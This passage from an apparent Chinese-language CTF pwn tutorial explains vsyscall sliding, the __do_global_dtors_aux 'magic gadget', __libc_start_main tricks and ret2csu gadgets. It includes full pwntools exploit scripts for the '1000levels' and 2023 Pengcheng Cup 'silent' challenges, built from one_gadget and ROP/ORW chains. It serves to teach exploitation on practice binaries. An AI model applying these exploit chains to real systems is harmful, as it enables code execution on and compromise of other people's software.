class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/1000levels&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>存在pie</p><p>程序有一个hint函数很关键,虽然我们无法使得show_int为非0,但是无论条件是否成立system的地址都会被保存到[rbp-0x110]处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">264</span>]; <span class="comment">// [rsp+8h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( show_hint )</span><br><span class="line">    <span class="built_in">sprintf</span>(v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(v1, <span class="string">&quot;NO PWN NO FUN&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000CFB 48 8B 05 CE 12 20 00          mov     rax, cs:system_ptr</span><br><span class="line">.text:0000000000000D02 48 89 85 F0 FE FF FF          mov     [rbp+var_110], rax</span><br></pre></td></tr></table></figure><p>再看另一个关键的函数go</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many levels?&quot;</span>);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">    v4 = num;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = v4 + read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">999</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;More levels than before!&quot;</span>);</span><br><span class="line">      v6 = <span class="number">1000LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">    v2 = time(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( level(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v7, <span class="string">&quot;Great job! You finished %d levels in %d seconds\n&quot;</span>, v6, (<span class="type">unsigned</span> <span class="type">int</span>)(v3 - v2));</span><br><span class="line">      <span class="built_in">puts</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为hint和go在调用时栈的环境是相同的,因此二者的rbp-0x110也是相同的</p><p>那么也就是说在go函数中若输入v4不大于0,v4便不会被初始化而是上次保存的system地址</p><p>之后的<code>v5 = v4 + read_num();</code>允许我们修改system地址</p><p>不过单独的system并没有什么作用,也无法写入binsh字符串,故而我们可以利用system来找到one_gadget</p><p>最后利用vsyscall使one_gadget成为返回地址</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)  </span><br><span class="line">p = process(<span class="string">&#x27;./1000levels&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">vsyscall = <span class="number">0xffffffffff600000</span>  </span><br><span class="line">  </span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">execv_gadget = <span class="number">0x4527a</span>  </span><br><span class="line">offset_addr = execv_gadget - system_addr  </span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;How many levels?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Any more?\n&#x27;</span>,<span class="built_in">str</span>(offset_addr))  </span><br><span class="line"></span><br><span class="line"><span class="comment">#level内部存在递归调用,当v5&gt;999时取1000次递归</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">999</span>):  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;Question: &#x27;</span>)  </span><br><span class="line">   a = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;* &#x27;</span>)  </span><br><span class="line">   b = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;Answer:&#x27;</span>,<span class="built_in">str</span>(a*b))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(vsyscall)*<span class="number">3</span>  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Answer:&#x27;</span>,payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>往往这个技术的思路是——在栈中寻找之前遗留的信息，通过溢出技术修改，并通过vsyscall将返回地址滑动到该信息处，从而完成攻击。</p><h1 id="magic-gadget"><a href="#magic-gadget" class="headerlink" title="magic gadget"></a>magic gadget</h1><p>有些elf文件中会存在这么一个函数<strong>_do_global_dtors_aux()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 _do_global_dtors_aux()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !completed_7698 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = deregister_tm_clones();</span><br><span class="line">    completed_7698 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004007D0                               __do_global_dtors_aux proc near         ; DATA XREF: .fini_array:__do_global_dtors_aux_fini_array_entry↓o</span><br><span class="line">.text:00000000004007D0 80 3D 61 08 20 00 00          cmp     cs:completed_7698, 0</span><br><span class="line">.text:00000000004007D7 75 17                         jnz     short locret_4007F0</span><br><span class="line">.text:00000000004007D7</span><br><span class="line">.text:00000000004007D9 55                            push    rbp</span><br><span class="line">.text:00000000004007DA 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004007DD E8 7E FF FF FF                call    deregister_tm_clones</span><br><span class="line">.text:00000000004007DD</span><br><span class="line">.text:00000000004007E2 C6 05 4F 08 20 00 01          mov     cs:completed_7698, 1</span><br><span class="line">.text:00000000004007E9 5D                            pop     rbp</span><br><span class="line">.text:00000000004007EA C3                            retn</span><br><span class="line">.text:00000000004007EA</span><br><span class="line">.text:00000000004007EA                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004007EB 0F 1F 44 00 00                align 10h</span><br><span class="line">.text:00000000004007F0</span><br><span class="line">.text:00000000004007F0                               locret_4007F0:                          ; CODE XREF: __do_global_dtors_aux+7↑j</span><br><span class="line">.text:00000000004007F0 F3 C3                         rep retn</span><br><span class="line">.text:00000000004007F0</span><br><span class="line">.text:00000000004007F0                               __do_global_dtors_aux endp</span><br></pre></td></tr></table></figure><p>单看函数和汇编可能并不会觉得这能有什么用处</p><p>但是如果将汇编截断,然后在0x4007E8处开始汇编代码就将变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:  01 5d c3                add    DWORD PTR [rbp-0x3d],ebx</span><br><span class="line">3:  0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">8:  f3 c3                   repz ret</span><br></pre></td></tr></table></figure><p>可见只要我们能够控制rbp和ebx就能够做到<strong>对某部分内存进行调整</strong></p><p>例如在无输出状态下,知道某个符号同另一符号的偏移</p><p>则可以将其调整为另一个符号</p><p>不过只能从低向高调整,因为add的是ebx寄存器,无法实现减法</p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><strong>2023鹏城杯-silent</strong></p><p>利用magic gadget调整stdout为syscall;ret的地址</p><p>并以此来打orw</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;../libc/&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> p,elf </span><br><span class="line">    p = process(name)</span><br><span class="line">    <span class="comment">#p = remote(&quot;172.10.0.8&quot;,9999)</span></span><br><span class="line">    elf = ELF(name)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400963</span></span><br><span class="line">start = <span class="number">0x400720</span></span><br><span class="line">csu_2 = <span class="number">0x00000000040095a</span></span><br><span class="line">csu_1 = <span class="number">0x000000000400940</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_p(<span class="string">&quot;./silent&quot;</span>)</span><br><span class="line">bss = <span class="number">0x602100</span></span><br><span class="line">magic = <span class="number">0x00000000004007e8</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400876</span></span><br><span class="line">stdout = <span class="number">0x000000000601020</span></span><br><span class="line">op = <span class="number">0xffffffffffffffff</span> &amp; (<span class="number">0x00000000000d2625</span>-libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>])</span><br><span class="line">syscall = p64(csu_2) + p64(op) + p64(stdout+<span class="number">0x3d</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(magic)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + p64(csu_2) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss-<span class="number">8</span>) + p64(<span class="number">0x200</span>) + p64(csu_1)</span><br><span class="line">payload += p64(bss-<span class="number">8</span>)*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span> + syscall</span><br><span class="line"></span><br><span class="line">payload += p64(csu_2) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss+<span class="number">0x300</span>) + p64(<span class="number">0x200</span>) + p64(csu_1)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(stdout) + p64(bss-<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(csu_1)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">3</span>) + p64(bss+<span class="number">0x400</span>) + p64(<span class="number">0x200</span>) + p64(csu_1)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0</span>) + p64(bss+<span class="number">0x300</span>) + p64(<span class="number">0x200</span>) + p64(csu_1)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(stdout) + p64(<span class="number">1</span>) + p64(bss+<span class="number">0x400</span>) + p64(<span class="number">0x40</span>) + p64(csu_1)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;\x00&quot;</span>*<span class="number">2</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;&quot;)</span></span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line">p.send(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="libc-start-main妙用"><a href="#libc-start-main妙用" class="headerlink" title="__libc_start_main妙用"></a>__libc_start_main妙用</h1><ol><li>__libc_start_main共有7个参数,不过正常利用下只需要注意前三个就行,分别是main,argc,argv</li><li>函数过程中会调用read,从而在栈上留下read的libc地址,一些情况下可以利用其中的syscall</li><li>最后启动main时main的三个参数分别是argc,argv,和__environ,__environ是一个栈地址数值很大</li></ol><p>__libc_start_main也可以启动除main以外的函数.甚至都不需要是函数只要是可执行的代码就行,不过需要另作一些布置</p><p>__libc_start_main在运行时会在栈上留下许多信息,其中包括一个read+17的地址,将其改写为read+15可以视为一个syscall;ret的gadget</p><p>一些特殊情况下,栈迁移后,在参数基本可控的时候,可以利用其重启某一段代码来做一些利用syscall</p><h1 id="libc-csu-init"><a href="#libc-csu-init" class="headerlink" title="_libc_csu_init"></a>_libc_csu_init</h1><p>在 64 位程序中，经常能看见用来对 libc 进行初始化操作的__libc_csu_init 函数,有时直接包含在init函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400900</span>                               public __libc_csu_init</span><br><span class="line">.text:<span class="number">0000000000400900</span>                               __libc_csu_init proc near               ; DATA XREF: _start+<span class="number">16</span>↑o</span><br><span class="line">.text:<span class="number">0000000000400900</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400900</span> <span class="number">41</span> <span class="number">57</span>                         push    r15</span><br><span class="line">.text:<span class="number">0000000000400902</span> <span class="number">41</span> <span class="number">56</span>                         push    r14</span><br><span class="line">.text:<span class="number">0000000000400904</span> <span class="number">49</span> <span class="number">89</span> D7                      mov     r15, rdx</span><br><span class="line">.text:<span class="number">0000000000400907</span> <span class="number">41</span> <span class="number">55</span>                         push    r13</span><br><span class="line">.text:<span class="number">0000000000400909</span> <span class="number">41</span> <span class="number">54</span>                         push    r12</span><br><span class="line">.text:<span class="number">000000000040090B</span> <span class="number">4</span>C <span class="number">8</span>D <span class="number">25</span> <span class="number">7</span>E <span class="number">04</span> <span class="number">20</span> <span class="number">00</span>          lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:<span class="number">0000000000400912</span> <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">0000000000400913</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">2</span>D <span class="number">7</span>E <span class="number">04</span> <span class="number">20</span> <span class="number">00</span>          lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:<span class="number">000000000040091</span>A <span class="number">53</span>                            push    rbx</span><br><span class="line">.text:<span class="number">000000000040091B</span> <span class="number">41</span> <span class="number">89</span> FD                      mov     r13d, edi</span><br><span class="line">.text:<span class="number">000000000040091</span>E <span class="number">49</span> <span class="number">89</span> F6                      mov     r14, rsi</span><br><span class="line">.text:<span class="number">0000000000400921</span> <span class="number">4</span>C <span class="number">29</span> E5                      sub     rbp, r12</span><br><span class="line">.text:<span class="number">0000000000400924</span> <span class="number">48</span> <span class="number">83</span> EC <span class="number">08</span>                   sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000000400928</span> <span class="number">48</span> C1 FD <span class="number">03</span>                   sar     rbp, <span class="number">3</span></span><br><span class="line">.text:<span class="number">000000000040092</span>C E8 <span class="number">4F</span> FD FF FF                call    _init_proc</span><br><span class="line">.text:<span class="number">000000000040092</span>C</span><br><span class="line">.text:<span class="number">0000000000400931</span> <span class="number">48</span> <span class="number">85</span> ED                      test    rbp, rbp</span><br><span class="line">.text:<span class="number">0000000000400934</span> <span class="number">74</span> <span class="number">20</span>                         jz      <span class="type">short</span> loc_400956</span><br><span class="line">.text:<span class="number">0000000000400934</span></span><br><span class="line">.text:<span class="number">0000000000400936</span> <span class="number">31</span> DB                         xor     ebx, ebx</span><br><span class="line">.text:<span class="number">0000000000400938</span> <span class="number">0F</span> <span class="number">1F</span> <span class="number">84</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       nop     dword ptr [rax+rax+<span class="number">00000000</span>h]</span><br><span class="line">.text:<span class="number">0000000000400938</span></span><br><span class="line">.text:<span class="number">0000000000400940</span></span><br><span class="line">.text:<span class="number">0000000000400940</span>                               loc_400940:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400940</span> <span class="number">4</span>C <span class="number">89</span> FA                      mov     rdx, r15</span><br><span class="line">.text:<span class="number">0000000000400943</span> <span class="number">4</span>C <span class="number">89</span> F6                      mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400946</span> <span class="number">44</span> <span class="number">89</span> EF                      mov     edi, r13d</span><br><span class="line">.text:<span class="number">0000000000400949</span> <span class="number">41</span> FF <span class="number">14</span> DC                   call    ds:(__frame_dummy_init_array_entry - <span class="number">600</span>D90h)[r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000400949</span></span><br><span class="line">.text:<span class="number">000000000040094</span>D <span class="number">48</span> <span class="number">83</span> C3 <span class="number">01</span>                   add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400951</span> <span class="number">48</span> <span class="number">39</span> DD                      cmp     rbp, rbx</span><br><span class="line">.text:<span class="number">0000000000400954</span> <span class="number">75</span> EA                         jnz     <span class="type">short</span> loc_400940</span><br><span class="line">.text:<span class="number">0000000000400954</span></span><br><span class="line">.text:<span class="number">0000000000400956</span></span><br><span class="line">.text:<span class="number">0000000000400956</span>                               loc_400956:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400956</span> <span class="number">48</span> <span class="number">83</span> C4 <span class="number">08</span>                   add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040095</span>A <span class="number">5B</span>                            pop     rbx</span><br><span class="line">.text:<span class="number">000000000040095B</span> <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">000000000040095</span>C <span class="number">41</span> <span class="number">5</span>C                         pop     r12</span><br><span class="line">.text:<span class="number">000000000040095</span>E <span class="number">41</span> <span class="number">5</span>D                         pop     r13</span><br><span class="line">.text:<span class="number">0000000000400960</span> <span class="number">41</span> <span class="number">5</span>E                         pop     r14</span><br><span class="line">.text:<span class="number">0000000000400962</span> <span class="number">41</span> <span class="number">5F</span>                         pop     r15</span><br><span class="line">.text:<span class="number">0000000000400964</span> C3                            retn</span><br><span class="line">.text:<span class="number">0000000000400964</span>                               ; &#125; <span class="comment">// starts at 400900</span></span><br><span class="line">.text:<span class="number">0000000000400964</span></span><br><span class="line">.text:<span class="number">0000000000400964</span>                               __libc_csu_init endp</span><br><span class="line">.text:<span class="number">0000000000400964</span></span><br><span class="line">.text:<span class="number">0000000000400964</span>                              </span><br></pre></td></tr></table></figure><p>利用的就是loc_400940和loc_400956这两个部分</p><p>若先跳转到<code>0x40095A</code>处那么可以直接控制rbx,rbp,r12,r13,r14,15六个寄存器</p><p>然后retn到<code>0x400940</code>处,就相当于间接控制了rdx,rsi,edi,以及rip</p><p>为了程序正常执行,一般会令rbx为0,rbp为1,</p><p>使得程序正常向下执行<strong>再次来到<code>0x40095A</code>处,此时可以选择退出csu,也可以构造chain_csu继续csu</strong></p><h2 id="偏移构造"><a href="#偏移构造" class="headerlink" title="偏移构造"></a>偏移构造</h2><p>关注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040095C 41 5C                         pop     r12</span><br><span class="line">.text:000000000040095E 41 5D                         pop     r13</span><br><span class="line">.text:0000000000400960 41 5E                         pop     r14</span><br><span class="line">.text:0000000000400962 41 5F                         pop     r15</span><br><span class="line">.text:0000000000400964 C3</span><br></pre></td></tr></table></figure><p>如果改变偏移使得返回到41h机器码之后则有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /5i 0x40095d</span><br><span class="line">   0x40095d &lt;__libc_csu_init+93&gt;:pop    rsp</span><br><span class="line">   0x40095e &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x400960 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400962 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400964 &lt;__libc_csu_init+100&gt;:ret    </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /5i 0x40095f</span><br><span class="line">   0x40095f &lt;__libc_csu_init+95&gt;:pop    rbp</span><br><span class="line">   0x400960 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400962 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400964 &lt;__libc_csu_init+100&gt;:ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 